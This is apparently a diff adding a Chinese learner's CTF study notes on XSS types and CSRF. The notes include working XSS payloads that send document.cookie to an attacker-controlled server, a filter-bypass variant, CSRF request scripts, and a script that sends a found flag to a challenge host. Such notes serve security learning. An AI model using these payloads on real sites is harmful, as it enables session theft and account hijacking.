@@ -1,0 +1,31 @@
+XSS漏洞
+
+从攻击代码的工作方式可以分为三个类型：
+（1）持久型跨站：最直接的危害类型，跨站代码存储在服务器（数据库）。
+（2）非持久型跨站：反射型跨站脚本漏洞，最普遍的类型。用户访问服务器-跨站链接-返回跨站代码。
+（3）DOM跨站（DOM XSS）：DOM（document object model文档对象模型），客户端脚本处理逻辑导致的安全问题。
+基于DOM的XSS漏洞是指受害者端的网页脚本在修改本地页面DOM环境时未进行合理的处置，而使得攻击脚本被执行。在整个攻击过程中，服务器响应的页面并没有发生变化，引起客户端脚本执行结果差异的原因是对本地DOM的恶意篡改利用
+
+对xss漏洞的理解感觉没有太深，目前已知的操作也就是三个方向，获取cookie   修改钓鱼链接    键盘记录
+对于获取cookie的绕过：
+利用服务器自动转链接来获取机器人的cookie，也就是管理员的cookie
+如果没有远程服务器，可以在做题网站上面开一个靶场，一段时间内作为你的服务器（嘿嘿）
+<script>window.location.href='http://你的服务器地址/x.php?1='+document.cookie</script>
+
+<body onload="window.location.href='http://你的服务器地址/x.php?1='+document.cookie"></body>
+
+<body/**/onload="window.location.href='http://你的服务器地址/x.php?1='+document.cookie"></body>
+
+get方式：<script>window.location.href='http://127.0.0.1/api/change.php?p=123';</script>
+post方式：<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script>
+
+还有
+<script>$('.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('ctf'+'show{')>-1){window.location.href='http://35560a54-87b6-4882-86b3-dc3517f16032.node3.buuoj.cn/upload/x.php?1='+value.innerHTML;}});</script>                        利用js写payload，不过还没有学（哭哭），现在还不清楚机理，难受了
+
+
+另外一点就是一般利用xss平台进行一些模块的利用，可以自己搭建，也可以通过网上的免费平台进行利用。
+
+CSRF：
+CSRF（Cross-site request forgery），中文名称：跨站请求伪造，攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。
+
+感觉可以和XSS进行组合，通过XSS获取cookie，然后用CSRF进行利用，不过都有相应的防御，token ，http only,  验证码等等，不过现在理解感觉还没有特别好，也不清楚其真正的利用，还需要成长，呜呜呜。
